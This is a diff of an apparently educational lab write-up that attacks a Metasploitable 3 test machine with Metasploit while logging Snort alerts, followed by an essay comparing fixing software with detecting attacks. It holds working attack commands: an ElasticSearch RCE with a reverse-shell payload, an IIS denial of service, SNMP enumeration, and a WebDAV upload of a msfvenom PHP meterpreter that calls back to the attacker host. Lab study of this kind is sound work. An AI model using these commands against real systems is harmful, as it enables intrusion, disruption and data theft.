@@ -4,12 +4,12 @@
 ## Setup
 * [Kali Linux](https://www.kali.org/)
 * [Metasploitable 3](https://github.com/rapid7/metasploitable3) with its requirements
-* [Snort](https://www.snort.org/) installed on the Kali
-* [Metasploit Community](https://www.rapid7.com/products/metasploit/download/)
+* [Snort](https://www.snort.org/) installed on the Kali with rules for registered users
+* [Metasploit Framework Console (msfconsole)](https://community.rapid7.com/community/metasploit)
 
 ## Initial scan
-Target ip in all cases: 172.28.128.3.
-### Using Metasploit Framework
+Target ip: 172.28.128.3.
+### Using the msf
 Command: `nmap -v -sV 172.28.128.3 -oA subnet_1`
 #### Results
      Nmap scan report for 172.28.128.3
@@ -46,10 +46,14 @@ Command: `nmap -v -sV 172.28.128.3 -oA subnet_1`
      ***A**** Seq: 0xA630394  Ack: 0xFDB044A7  Win: 0xE200  TcpLen: 32
      [Xref => http://osvdb.org/show/osvdb/121816][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-8249]
 
+#### Comments
+This one leads to total ownage of the target system since meterpreter session with system privileges is acquired.
+
 ### ElasticSearch - CVE-2014-3120
 #### Commands in the msf
      use exploit/multi/elasticsearch/script_mvel_rce
      set rhost 172.28.128.3
+     set payload java/shell/reverse_tcp
      exploit
     
 #### Results in the Snort alert log
@@ -61,7 +65,6 @@ Command: `nmap -v -sV 172.28.128.3 -oA subnet_1`
      ***AP*** Seq: 0x7871FD5A  Ack: 0x603FC539  Win: 0xE5  TcpLen: 32
      TCP Options (3) => NOP NOP TS: 9491928 1410943 
      [Xref => http://bouk.co/blog/elasticsearch-rce/][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-3120]
-
 
      [**] [1:36256:1] SERVER-OTHER ElasticSearch information disclosure attempt [**]
      [Classification: Potential Corporate Privacy Violation] [Priority: 1] 
@@ -87,6 +90,9 @@ Command: `nmap -v -sV 172.28.128.3 -oA subnet_1`
      TCP Options (3) => NOP NOP TS: 9492173 1411042 
      [Xref => http://bouk.co/blog/elasticsearch-rce/][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2014-3120]
 
+#### Comments
+User level meterpreter session acquired.
+
 ### IIS - HTTP - CVE-2015-1635
 #### Commands in the msf
      use auxiliary/dos/http/ms15_034_ulonglongadd
@@ -102,8 +108,72 @@ Command: `nmap -v -sV 172.28.128.3 -oA subnet_1`
      ***AP*** Seq: 0x7EEE4D57  Ack: 0x1FAA7483  Win: 0x400  TcpLen: 32
      [Xref => http://technet.microsoft.com/en-us/security/bulletin/ms15-034][Xref => http://cve.mitre.org/cgi-bin/cvename.cgi?name=2015-1635][Xref => http://www.securityfocus.com/bid/74013]
 
+#### Comments
+Wau, BSOD.
+
 ## Two attacks that Snort doesn't identify
-### 1
-### 2
+### auxiliary/scanner/snmp/snmp_enum
+#### Commands in the msf
+     use auxiliary/scanner/snmp/snmp_enum
+     set rhost 172.28.128.3
+     run
+
+#### Results
+todo: put a link here
+
+#### Comments
+A lot of useful information can be acquired with this one. E.g. all users and running processes are very critical data. Tried to find SIDs to enable. Found SID 516, but no alerts with that.
+
+### WebDAV - OSVDB-397
+#### Verification
+##### Commands in the msf
+      use auxiliary/scanner/http/http_put
+      set rhosts 172.28.128.3
+      set rport 8585
+      set path /uploads
+      set filename test.txt
+      set filedata muahahaha
+      run
+
+##### Is it there?
+      Use a meterpreter session to find out that is there a file named test.txt in dir C:\wamp\www\uploads with string "muahahaha".
+
+#### Exploitation
+Sources [https://github.com/rapid7/metasploitable3/pull/16](https://github.com/rapid7/metasploitable3/pull/16) and [https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)
+##### Generate a PHP meterpreter
+      msfvenom -p php/meterpreter/reverse_tcp lhost=172.28.128.1 lport=5555 -f raw -o /tmp/evil.php
+##### In a msf console 1
+      use use exploit/multi/handler
+      set payload php/meterpreter/reverse_tcp
+      set lhost 172.28.128.1
+      set lport 5555
+      run
+
+##### Then in a msf console 2
+      use auxiliary/scanner/http/http_put
+      set rhosts 172.28.128.3
+      set rport 8585
+      set path /uploads
+      set filename evil.php
+      set filedata file://tmp/evil.php
+      run
+
+##### Check the msf console 1
+There should be a meterpreter session established with LOCAL SERVICE (0) privileges.
 
 ## Is it easier to fix the application than to detect attacks?
+Neither is good. Applications should be developed so that fixing and detection are not needed in the first place.
+
+When the question is about *fixing* and *detecting*, one should think differences between fixing and detecting. Also consequences of different strategies or actions should be considered.
+
+Detecting attacks doesn't always lead to successful prevention. Fixing an application can make detections purposeless in the first place.
+
+Why there's need for fixes in a software? Software development isn't easy. Developing secure software is not certainly easier. Even if there's very skilled devs working on a software, it's better to believe that there's some mistakes related to security aspects in the software. Then there's very skilled security researchers who try to find vulnerabilities. In white hat community researchers tend to tell about the vulnerabilities to right authorities. Then, if the authorities are reliable and responsible, they fix their software fast.
+
+If assumed that in a system all software are up to date and all configs are done in secure way, then detecting known software attacks can be thought to be somehow purposeless. So what if there's attacks which are not dangerous for the system? But yes, detections can be used in avoiding bad traffic to the system. IDS systems are still needed, because not all attacks are against some known vulnerabilities against some web server software. Machine learning is used and will be used in detecting divergent traffic to a system (or out of). Traffic related to some not publicly known or rare intrusion techniques.
+
+It could be possible to find out a not publicly known vulnerability in a software by catching exploit attempts with an IDS.
+
+Which one is then easier? Software has to be well designed and implemented. There's no question about that. In real world security of a software improves over time. Servers are not always up to date. Therefore detection is good for cases like that. In my opinion it is much easier to fix a software than let it be and rely on detections. Fixing a software demands developers to write fixes and then distribute updates. Not fixing a software causes probably a lot of hassle in many organizations and detecting is not still enough! Also amount of active detection rules grow too much if one relies on detections too much. If thought from aggregate amount of work point of view, then fixing a software is easier. And if thought from aggregate amount of security point of view fixing software is also easier.
+
+But. If the question is just read literally, then it just depends on the application and the attackers. How vulnerable is the application? How complex is the application? How skilled are the attackers?
